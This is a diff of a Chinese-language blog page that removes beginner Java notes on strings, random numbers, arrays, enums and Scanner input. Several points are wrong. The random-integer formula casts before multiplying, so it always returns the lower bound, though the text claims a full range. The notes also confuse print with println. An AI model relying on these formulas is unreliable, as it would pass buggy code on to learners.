name.indexOf(&quot;wen&quot;);</span><br><span class="line">		System.out.println(index);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们要查找wen这一子串，最后会返回’w’索引4<br>字符串比较</p>
-<p>由于一开始我们接触的语言是C语言，所以我们会本能反应用==或者!=来比较字符串，但是这是错误的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String name1 = &quot;zbc&quot;;</span><br><span class="line">		String name2 = &quot;zbc&quot;;</span><br><span class="line">		if(name1 == name2) &#123;</span><br><span class="line">			System.out.println(&quot;相等&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>以上是我们按照C语言思路来进行编写的，但是是错误的<br>对于Java应该采取equals来进行比较</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String name1 = &quot;zbc&quot;;</span><br><span class="line">		String name2 = &quot;zbc&quot;;</span><br><span class="line">		if(name1.equals(name2)) &#123;</span><br><span class="line">			System.out.println(&quot;相等&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果字符串是不同的，可以用compare来确定根据字母表顺序排列哪个字符串在前面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String name1 = &quot;zbc1&quot;;</span><br><span class="line">		String name2 = &quot;zbc2&quot;;</span><br><span class="line">		int diff = name1.compareTo(name2);</span><br><span class="line">		System.out.println(diff);</span><br><span class="line">		if(diff==0) &#123;</span><br><span class="line">			System.out.println(&quot;Same!!!&quot;);</span><br><span class="line">		&#125;else if(diff&lt;0) &#123;</span><br><span class="line">			System.out.println(&quot;name1 comes before name2&quot;);</span><br><span class="line">		&#125;else if(diff&gt;0) &#123;</span><br><span class="line">			System.out.println(&quot;name2 comes before name1&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>方法compareTo会返回两个字符串中第一个不同的字符的差。如果两个字符串相等，则差为0；<br>Add：前面的代码diff值为-1，因为它们第四位分别是1与2，对应的编码值相差1</p>
-<p>字符串格式</p>
-<p>1、字符串格式设置</p>
-<p>涉及到方法String.format，它与String.printf相同：一个格式说明符和一系列的值，主要差别在于后者将结果显示到屏幕上，前者则创建一个新的字符串但什么都不显示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		System.out.println(timeString(13, 50));</span><br><span class="line">	&#125;</span><br><span class="line">	public static String timeString(int hour,int minute) &#123;</span><br><span class="line">		String ampm;</span><br><span class="line">		if(hour&lt;12) &#123;</span><br><span class="line">			ampm = &quot;AM&quot;;</span><br><span class="line">			if(hour==0) &#123;</span><br><span class="line">				hour = 12;	//午夜</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			ampm = &quot;PM&quot;;</span><br><span class="line">			hour -= 12;</span><br><span class="line">		&#125;</span><br><span class="line">		return String.format(&quot;%02d:%02d %s&quot;, hour, minute, ampm);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>print、printf以及println区别<br>首先print与printf没什么太大的区别，也就是一个会换行，一个不会换行，而printf主要是继承了C语言的一些特性，它常用于格式转换</p>
-<p>Math.random:</p>
-<p>首先Math.random()是随机生成一个大于等于 0.0 且小于 1.0 (前开后闭)的伪随机 double 值，为方便叙述将其表示为：Math.random:[0.0,1.0)</p>
-<p>下面以整数(int)为例子:</p>
-<p>通常，如果我们需要获取从[x，y)范围内的伪随机数，有下面这样的公式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.random()*(y-x)+x</span><br></pre></td></tr></table></figure>
-<p> 如果我们需要闭区间的呢，也就是需要获取从[x，y]范围内的伪随机整数，其实也很简单，只需要</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(int)Math.random()*(y-x+1)+x</span><br></pre></td></tr></table></figure>
-<p>为了方便理解，我们取x=10，y=35；为例子<br>首先</p>
-<p>Math.random：[0.0,1.0)</p>
-<p>Math.random()(35-10)：[0.0,25.0)</p>
-<p>Math.random()(35-10+1)：[0.0,26.0)</p>
-<p>所以</p>
-<p>Math.random()(35-10+1)+10：[10.0,36.0)</p>
-<p>由于强转为int会丢失精度，也就是舍去小数部分，因此得到</p>
-<p>(int)Math.random()(35-10+1)+10：[10,35]（值为整数）</p>
-<p> 若需要[x，y)范围的伪随机数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.random()*(y-x)+x</span><br></pre></td></tr></table></figure>
-<p>若需要[x，y]范围的伪随机整数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(int)Math.random()*(y-x+1)+x</span><br></pre></td></tr></table></figure>
-
-<p>数组反转：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class Test&#123;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">	int[] arr = new int[] &#123;1,2,3,4,5&#125;;</span><br><span class="line">	//数组的反转</span><br><span class="line">	for(int i =0;i &lt; arr.length / 2;i++) &#123;</span><br><span class="line">		int temp = arr[i];</span><br><span class="line">		arr[i] = arr[arr.length - i - 1];</span><br><span class="line">		arr[arr.length - i - 1] = temp;</span><br><span class="line">	&#125;</span><br><span class="line">	//数组的遍历</span><br><span class="line">	for(int x:arr) &#123;</span><br><span class="line">		System.out.print(x+&quot; &quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> 第二种，不过要建立两个数组，方便理解一点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(int i =0,j=arr.length-1;i&lt;j;i++,j--)&#123;</span><br><span class="line">	int temp = arr[i];</span><br><span class="line">		arr[i] = arr[arr.length - i - 1];</span><br><span class="line">		arr[arr.length - i - 1] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>数组查找(顺序查找）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">	String[] arr = new String[] &#123;&quot;aa&quot;,&quot;bb&quot;,&quot;cc&quot;,&quot;dd&quot;&#125;;</span><br><span class="line">	String dest = &quot;bb&quot;;</span><br><span class="line">	boolean isFlag = true;</span><br><span class="line">	for(int i=0;i&lt;arr.length;i++) &#123;</span><br><span class="line">		if(dest.equals(arr[i])) &#123;</span><br><span class="line">			System.out.println(&quot;找到了，位置在：&quot;+i);</span><br><span class="line">			isFlag = false;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isFlag) &#123;</span><br><span class="line">		System.out.println(&quot;抱歉，没有找到&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>数组异常</p>
-<p>数组的越界</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int[] arr = new int[4];</span><br><span class="line">for(int i=0;i&lt;arr.length;i++)&#123;</span><br><span class="line">	statement.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个例子是正确的，但如果把里面的条件改为<code>i&lt;=arr.length</code>，便会导致越界；<br>当然越界也可能是左边界越界 </p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/Java/Java%E7%AC%94%E8%AE%B04/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/28/Java/Java%E7%AC%94%E8%AE%B04/" class="post-title-link" itemprop="url">Java笔记4</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-04-28 14:15:01" itemprop="dateCreated datePublished" datetime="2022-04-28T14:15:01+08:00">2022-04-28</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-05-03 21:16:49" itemprop="dateModified" datetime="2022-05-03T21:16:49+08:00">2022-05-03</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>1、Java中的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%9E%9A%E4%B8%BE&spm=1001.2101.3001.7020">枚举</a></p>
-<p>语法格式：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=enum&spm=1001.2101.3001.7020">enum</a> 枚举名{枚举值表}；</p>
-<p>用枚举名+.进行访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enum MyColor&#123;红色,绿色,蓝色&#125;;</span><br><span class="line"></span><br><span class="line">public class Enum1 &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		MyColor c1 = MyColor.红色;</span><br><span class="line">		MyColor c2 = MyColor.绿色;</span><br><span class="line">		MyColor c3 = MyColor.蓝色;</span><br><span class="line">		System.out.println(c1);</span><br><span class="line">		System.out.println(c2);</span><br><span class="line">		System.out.println(c3);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>1.2 在switch语句中用枚举</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">enum MyColor&#123;红色,绿色,蓝色&#125;;</span><br><span class="line"></span><br><span class="line">public class Enum1 &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		MyColor c1 = MyColor.红色;</span><br><span class="line">		MyColor c2 = MyColor.绿色;</span><br><span class="line">		MyColor c3 = MyColor.蓝色;</span><br><span class="line">		switch (c1) &#123;</span><br><span class="line">		case 红色:</span><br><span class="line">			System.out.println(&quot;我是红色&quot;);</span><br><span class="line">			break;</span><br><span class="line">		case 绿色:</span><br><span class="line">			System.out.println(&quot;我是绿色&quot;);</span><br><span class="line">			break;</span><br><span class="line">		case 蓝色:</span><br><span class="line">			System.out.println(&quot;我是蓝色&quot;);</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>2、枚举类和枚举关键字<br>2.1</p>
-<p>Values方法：返回枚举值组成的数组</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enum MyColor&#123;红色,绿色,蓝色&#125;;</span><br><span class="line"></span><br><span class="line">public class Enum1 &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		MyColor[] allColor = MyColor.values();</span><br><span class="line">		for(MyColor aColor:allColor) &#123;</span><br><span class="line">			System.out.println(aColor);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>2.2、枚举类：Enum</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enum MyColor&#123;红色,绿色,蓝色&#125;;</span><br><span class="line"></span><br><span class="line">public class Enum1 &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		MyColor[] allColor = MyColor.values();</span><br><span class="line">		for(MyColor aColor:allColor) &#123;</span><br><span class="line">			System.out.println(aColor.name()+&quot;--&gt;&quot;+aColor.ordinal());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>另外枚举关键字编号默认从0开始<br>Scanner类</p>
-<p>它提供了输入数据的方法、包含在被称为“实用类”的java.util包中；</p>
-<p>在使用前需要创建一个Scanner对象；</p>
-<p>声明一个名为in的Scanner变量，并新建一个Scanner对象以便从System.in中获取输入；</p>
-<p>Scanner in = new Scanner(System.in);</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String line;</span><br><span class="line">		Scanner in = new Scanner(System.in);</span><br><span class="line">		</span><br><span class="line">		System.out.print(&quot;Type something:&quot;);</span><br><span class="line">		line = in.nextLine();</span><br><span class="line">		System.out.println(&quot;You said：&quot;+line);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>另外next和nextline是有区别的，前者读到空白符就结束读取，后者读到回车就结束读取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String line;</span><br><span class="line">		Scanner in = new Scanner(System.in);</span><br><span class="line">		</span><br><span class="line">		System.out.print(&quot;Type something(nextline)：&quot;);</span><br><span class="line">		line = in.nextLine();</span><br><span class="line">		System.out.println(&quot;You said：&quot;+line);</span><br><span class="line">		</span><br><span class="line">		System.out.print(&quot;Type something(next)：&quot;);</span><br><span class="line">		line = in.next();		</span><br><span class="line">		System.out.println(&quot;You said：&quot;+line);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>具体的可以去api查询<br>1、字符串的遍历</p>
-<p>在Java中，字符串提供了提取字符的方法charAt，这个方法会返回一个char，因此我们可以利用这一点来实现字符串的遍历；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String str =&quot;abcdefg&quot;;</span><br><span class="line">		for(int i=0;i&lt;str.length();i++) &#123;</span><br><span class="line">			char letter = str.charAt(i);</span><br><span class="line">			System.out.println(letter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>2、字符串的反转</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String str =&quot;abcdefg&quot;;</span><br><span class="line">		String str2 = reverse(str);</span><br><span class="line">		printArr(str);</span><br><span class="line">		printArr(str2);</span><br><span class="line">	&#125;</span><br><span class="line">	private static void printArr(String str) &#123;</span><br><span class="line">		for(int i=0;i&lt;str.length();i++) &#123;</span><br><span class="line">			char letter = str.charAt(i);</span><br><span class="line">			System.out.print(letter);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(&quot;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	public static String reverse(String s) &#123;</span><br><span class="line">		String a =&quot;&quot;;</span><br><span class="line">		for (int i = s.length() - 1;i&gt;=0;i--) &#123;</span><br><span class="line">			a= a + s.charAt(i);</span><br><span class="line">		&#125;</span><br><span class="line">		return a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>那么有一个问题，定义好的字符串是否能够修改</p>
-<p>答案是否定的</p>
-<p>我们知道字符串提供了toUpperCase和tolowerCase来转换大小写的方法，但并不意味着字符串可以修改；</p>
-<p>但是可以使用其他方法来间接改变，比如replace进行替换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		String text = &quot;aaa&quot;;</span><br><span class="line">		text = text.replace(&quot;aaa&quot;, &quot;bbb&quot;);</span><br><span class="line">		System.out.println(text);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
